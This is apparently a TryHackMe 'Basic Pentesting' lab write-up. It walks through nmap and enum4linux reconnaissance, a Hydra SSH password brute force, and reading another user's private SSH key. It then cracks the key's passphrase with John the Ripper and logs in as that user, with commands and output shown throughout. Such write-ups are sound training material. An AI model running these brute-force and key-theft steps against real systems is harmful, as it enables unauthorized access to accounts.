# BasicPentestingLab-From TryHackMe 

[This lab can be found here](https://tryhackme.com/room/basicpentestingjt)

For my setup I used my own Kali VM and openvpn. To use this method start the machine and download the openvpn config file and save into your project folder. Be sure to start openvpn before accessing machine. 

```sudo openvpn [path to .ovpn file]```

Once connected I usually ping the box we are attacking to make sure I can connect. Success.
```
─$ ping [IP Address]
PING [IP Address] ([IP Address]) 56(84) bytes of data.
64 bytes from [IP Address]: icmp_seq=1 ttl=61 time=442 ms
64 bytes from [IP Address]: icmp_seq=2 ttl=61 time=355 ms
```

Next run an nmap scan to see what is available. It's probably better to output this to a file using the -oN tag to save the file. However I didn't. The important thing is we can see this:
```
22/tcp   open     ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open     http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open     netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP
smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-15T00:17:55
|_  start_date: N/A
```

I started with the Apache server first. Putting the IP into a browser yields the following:
![main page](https://raw.githubusercontent.com/erok81/BasicPentestingLab-THM/main/basic/main_page.png)

A quick inspection of the source code for that page yields more information. Comments showing something about a dev page? 
```HTML
<html>

<h1>Undergoing maintenance</h1>

<h4>Please check back later</h4>
<!-- Check our dev note section if you need to know what to work on. -->

</html>
```

Normally we could run gobuster or dirbuster (these are applications designed to brute force directories and files names on web/application servers) to find all of the available directories. Since that note was pretty easy to figure out, I tried /dev and then /development. The second one worked and now had some files to view.

This gets us our first answer: What is the name of the hidden directory on the web server(enter name without /)?

![main page](https://raw.githubusercontent.com/erok81/BasicPentestingLab-THM/main/basic/hidden_page.png)

Viewing the first file, dev.txt, the following:
```
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```

Here we can see that we might have a version of Apache Struts with vulnerabilities. For now let's move to the second file, j.txt.
```
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
```
We know there might be two users starting with J and K. Additionally one of them, "J", has a weak password.

From the nmap scan we saw an smb share was available. There is a tool called enum4linux that can help find usernames. This can be done with the following command. Using -a runs with all options. It's probably best to tee to this to a file as the output is messy to look through otherwise. 
```
enum4linux -a | tee enum.txt

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\[redacted] (Local User)
S-1-22-1-1001 Unix User\[redacted] (Local User)
```

Success. We have our two users. Go ahead and fill these answers out back on the site. 

Again from the nmap scan we have an ssh port open. Using Hydra we can brute force the password information. We'll use ssh.
```
$ hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.237.162 ssh    

[22][ssh] host: 10.10.237.162   login: j[xx]   password: [redacted]
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-14 20:48:44
```
Success now we have J's password. Enter this on the site before continuing. 
Log into Jan's ssh with the new password
```
$ ssh j[xx]@10.10.237.162  

Last login: Mon Apr 23 15:55:45 2018 from 192.168.56.102
j[xx]@basic2:~$ 

no root access
```
As we can see no root access with this user. Not much to do with this user, however we can see into the other user, Kay's, directory.
```
j[xx]@basic2:/home/kay$ ls -la
total 48
drwxr-xr-x 5 kay  kay  4096 Apr 23  2018 .
drwxr-xr-x 4 root root 4096 Apr 19  2018 ..
-rw------- 1 kay  kay   756 Apr 23  2018 .bash_history
-rw-r--r-- 1 kay  kay   220 Apr 17  2018 .bash_logout
-rw-r--r-- 1 kay  kay  3771 Apr 17  2018 .bashrc
drwx------ 2 kay  kay  4096 Apr 17  2018 .cache
-rw------- 1 root kay   119 Apr 23  2018 .lesshst
drwxrwxr-x 2 kay  kay  4096 Apr 23  2018 .nano
-rw------- 1 kay  kay    57 Apr 23  2018 pass.bak
-rw-r--r-- 1 kay  kay   655 Apr 17  2018 .profile
drwxr-xr-x 2 kay  kay  4096 Apr 23  2018 .ssh
-rw-r--r-- 1 kay  kay     0 Apr 17  2018 .sudo_as_admin_successful
-rw------- 1 root kay   538 Apr 23  2018 .viminfo
```
Checking to K[xx]'s ssh folder, we can see some keys.
```
jan@basic2:/home/kay$ cd .ssh
jan@basic2:/home/kay/.ssh$ ls -la
total 20
drwxr-xr-x 2 kay kay 4096 Apr 23  2018 .
drwxr-xr-x 5 kay kay 4096 Apr 23  2018 ..
-rw-rw-r-- 1 kay kay  771 Apr 23  2018 authorized_keys
-rw-r--r-- 1 kay kay 3326 Apr 19  2018 id_rsa
-rw-r--r-- 1 kay kay  771 Apr 19  2018 id_rsa.pub
```
The key is visible to our Jan user...
```
jan@basic2:~$ cat /home/kay/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6ABA7DE35CDB65070B92C1F760E2FE75

IoNb/J0q2Pd56EZ23oAaJxLvhuSZ1crRr4ONGUAnKcRxg3+9vn6xcujpzUDuUtlZ
o9dyIEJB4wUZTueBPsmb487RdFVkTOVQrVHty1K2aLy2Lka2Cnfjz8Llv+FMadsN
[snip]
4eaCAHk1hUL3eseN3ZpQWRnDGAAPxH+LgPyE8Sz1it8aPuP8gZABUFjBbEFMwNYB
e5ofsDLuIOhCVzsw/DIUrF+4liQ3R36Bu2R5+kmPFIkkeW1tYWIY7CpfoJSd74VC
3Jt1/ZW3XCb76R75sG5h6Q4N8gu5c/M0cdq16H9MHwpdin9OZTqO2zNxFvpuXthY
-----END RSA PRIVATE KEY-----
```

Copy this file over to kali machine, change permissions, and try to log in to ssh as Kay. 
```
chmod 600 id_rsa

─$ ssh -i id_rsa kay@10.10.237.162
Enter passphrase for key 'id_rsa':

```
We don't have the passphraase Kay, but we do have a tool that might help with this. John the Ripper. 

First convert the id_rsa file into something John can use. 
```
/usr/share/john/ssh2john.py id_rsa > crack
```
Then use John to see if the passphrase is available. 
```
└─$ john crack --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
[redacted]          (id_rsa)
1g 0:00:00:05 DONE (2021-08-14 21:05) 0.1904g/s 2731Kp/s 2731Kc/s 2731KC/sie168..*7¡Vamos!
Session completed
```

Finally ssh in using Kay's ssh key along with the new passphrase.
```
└─$ ssh -i id_rsa kay@10.10.237.162                       
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)
```
Let's first check what is in Kay's home directory.
```
kay@basic2:~$ ls
pass.bak
kay@basic2:~$ cat pass.bak 
[redacted]
```

The final question can be answered: 
What is the final password you obtain?

Congratulations. First TryHackMe box has been completed!

